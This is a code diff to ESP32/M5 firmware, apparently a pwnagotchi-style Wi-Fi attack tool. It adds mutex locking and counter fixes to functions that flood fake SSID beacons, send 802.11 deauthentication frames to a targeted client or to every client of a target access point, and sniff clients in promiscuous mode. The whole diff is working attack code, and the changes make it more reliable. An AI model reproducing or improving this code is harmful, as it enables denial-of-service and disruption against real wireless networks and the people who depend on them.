@@ -98,7 +98,9 @@ void broadcastFakeSSIDs(String ssidList[], int ssidCount, bool sound) {
       uint8_t ch = channels[channelIndex];
       channelIndex = (channelIndex + 1) % (sizeof(channels));
       wifi_channel = ch;
+      xSemaphoreTake(wifiMutex, portMAX_DELAY);
       esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
+      xSemaphoreGive(wifiMutex);
     }
   };
 
@@ -108,7 +110,9 @@ void broadcastFakeSSIDs(String ssidList[], int ssidCount, bool sound) {
   wifion(); // Set to station mode
 
   // Set initial Wi-Fi channel
+  xSemaphoreTake(wifiMutex, portMAX_DELAY);
   esp_wifi_set_channel(channels[0], WIFI_SECOND_CHAN_NONE);
+  xSemaphoreGive(wifiMutex);
 
   // Main broadcast loop
   while (true) {
@@ -151,7 +155,9 @@ void broadcastFakeSSIDs(String ssidList[], int ssidCount, bool sound) {
         // Send the beacon packet
         if (appendSpaces) {
           for (int k = 0; k < 3; k++) {
+            xSemaphoreTake(wifiMutex, portMAX_DELAY);
             packetCounter += esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, packetSize, 0) == 0;
+            xSemaphoreGive(wifiMutex);
             delay(1);
           }
         } else {
@@ -167,7 +173,9 @@ void broadcastFakeSSIDs(String ssidList[], int ssidCount, bool sound) {
           memcpy(&tmpPacket[38 + ssidLen], &beaconPacket[70], 39);
 
           for (int k = 0; k < 3; k++) {
+            xSemaphoreTake(wifiMutex, portMAX_DELAY);
             packetCounter += esp_wifi_80211_tx(WIFI_IF_STA, tmpPacket, tmpPacketSize, 0) == 0;
+            xSemaphoreGive(wifiMutex);
             delay(1);
           }
         }
@@ -223,7 +231,7 @@ void broadcastFakeSSIDs(const char * const ssidList[], int ssidCount, bool sound
   auto randomMac = [&macAddr]() {
     for (int i = 0; i < 6; i++) macAddr[i] = random(256);
   };
-
+  xSemaphoreTake(wifiMutex, portMAX_DELAY);
   auto nextChannel = [&wifi_channel, &channelIndex, &channels]() {
     if (sizeof(channels) > 1) {
       uint8_t ch = channels[channelIndex];
@@ -236,6 +244,7 @@ void broadcastFakeSSIDs(const char * const ssidList[], int ssidCount, bool sound
   logMessage("Hello, NodeMCU! Broadcasting fake SSIDs... (C-list)");
   wifion();
   esp_wifi_set_channel(channels[0], WIFI_SECOND_CHAN_NONE);
+  xSemaphoreGive(wifiMutex);
 
   while (true) {
     M5.update();
@@ -262,7 +271,9 @@ void broadcastFakeSSIDs(const char * const ssidList[], int ssidCount, bool sound
 
         if (appendSpaces) {
           for (int k = 0; k < 3; k++) {
+            xSemaphoreTake(wifiMutex, portMAX_DELAY);
             packetCounter += esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, packetSize, 0) == 0;
+            xSemaphoreGive(wifiMutex);
             delay(1);
           }
         } else {
@@ -273,7 +284,9 @@ void broadcastFakeSSIDs(const char * const ssidList[], int ssidCount, bool sound
           memcpy(&tmpPacket[38], ssid, ssidLen);
           memcpy(&tmpPacket[38 + ssidLen], &beaconPacket[70], 39);
           for (int k = 0; k < 3; k++) {
+            xSemaphoreTake(wifiMutex, portMAX_DELAY);
             packetCounter += esp_wifi_80211_tx(WIFI_IF_STA, tmpPacket, tmpPacketSize, 0) == 0;
+            xSemaphoreGive(wifiMutex);
             delay(1);
           }
         }
@@ -312,8 +325,10 @@ bool send_deauth_packets(String &client_mac_str, int count, int delay_ms) {
   };
 
 
-  for(uint16_t i; i<=count; i++){
+  for(uint16_t i = 0; i<=count; i++){
+    xSemaphoreTake(wifiMutex, portMAX_DELAY);
     esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+    xSemaphoreGive(wifiMutex);
     if (result == ESP_OK) {
       delay(delay_ms); // Delay between packets
     } else {
@@ -324,41 +339,50 @@ bool send_deauth_packets(String &client_mac_str, int count, int delay_ms) {
 }
 
 bool deauth_everyone(int count, int delay_ms) {
-  logMessage("Deauthing everyone connected to: " + macToString(target_mac) + " count: " + String(count) + " delay: " + String(delay_ms));
-  
+  if (!pwnagotchi.deauth_on) return false;
+
   uint8_t deauth_packet[26] = {
-    0xC0, 0x00,   // Typ i podtyp ramki: deauth
-    0x3A, 0x01,   // Czas trwania
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // MAC odbiorcy (broadcast)
-    target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5],  // MAC nadawcy
-    target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5],  // BSSID
-    0x00, 0x00,   // Numer sekwencji
-    0x01, 0x00    // Powód deautoryzacji
+    0xC0, 0x00,
+    0x3A, 0x01,
+    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
+    target_mac[0],target_mac[1],target_mac[2],
+    target_mac[3],target_mac[4],target_mac[5],
+    target_mac[0],target_mac[1],target_mac[2],
+    target_mac[3],target_mac[4],target_mac[5],
+    0x00,0x00,
+    0x01,0x00
   };
 
-  for(uint16_t i; i<=count; i++){
-    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
-    if (result == ESP_OK) {
-      delay(delay_ms); // Delay between packets
-    } else {
-      logMessage("Error sending packet. Counter: " + String(i) + " Error code: " + String(result));
+  for (uint16_t i = 0; i < count; i++) {
+    xSemaphoreTake(wifiMutex, portMAX_DELAY);
+    esp_err_t res = esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+    xSemaphoreGive(wifiMutex);
+    if (res != ESP_OK) {
+      logMessage("Deauth TX failed: " + String(res));
+      printHeapInfo();
       return false;
     }
+    delay(delay_ms);
   }
   return true;
 }
 
+
 void initClientSniffing() {
+  xSemaphoreTake(wifiMutex, portMAX_DELAY);
   esp_wifi_set_promiscuous(false);
   esp_wifi_set_promiscuous_rx_cb(&deauth_promiscuous_rx_cb);
   esp_wifi_set_promiscuous(true);     // Enable sniffing AFTER setting callback
   logMessage("Sniffing for network_clients...");
+  xSemaphoreGive(wifiMutex);
 }
 
 void stopClientSniffing(){
+  xSemaphoreTake(wifiMutex, portMAX_DELAY);
   clearClients();
   esp_wifi_set_promiscuous(false);
   wifion();
+  xSemaphoreGive(wifiMutex);
 }
 
 void deauth_promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
@@ -495,7 +519,9 @@ uint8_t set_target_channel(const char* target_ssid) {
             logMessage(target_ssid);
             logMessage("Setting chanel to: ");
             logMessage(String(target_channel));
+            xSemaphoreTake(wifiMutex, portMAX_DELAY);
             esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
+            xSemaphoreGive(wifiMutex);
             return target_channel;
         }
     }
